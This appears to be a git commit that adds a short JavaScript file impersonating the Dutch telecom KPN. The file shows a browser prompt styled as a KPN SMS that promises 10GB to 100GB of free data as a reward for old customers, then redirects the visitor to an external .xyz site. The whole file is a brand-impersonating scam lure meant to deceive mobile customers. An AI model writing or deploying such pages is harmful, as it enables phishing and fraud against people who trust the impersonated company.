1c7ba9999cda921712bafb0b7c8ebace06c90306
inemitid <asuquodavid021@gmail.com>
2025-05-27 13:04:31 -0700

    Create activation-kpn-freeinternetdata.js

---
+++ activation-kpn-freeinternetdata.js
@@ -0,0 +1,5 @@
+var password = 'FREE DATA'
+password=prompt('KPN SMS: Dear Customer, Kindly Check If your KPN Sim Card Is Qualify To Receive From 10GB To 100GB data, Old Customers Reward, press Free Data To Check Now ','FREE DATA');
+if (password != 'FREE DATA') {
+location.href='https://surfest.xyz/kpn-freeinternetdata';
+}
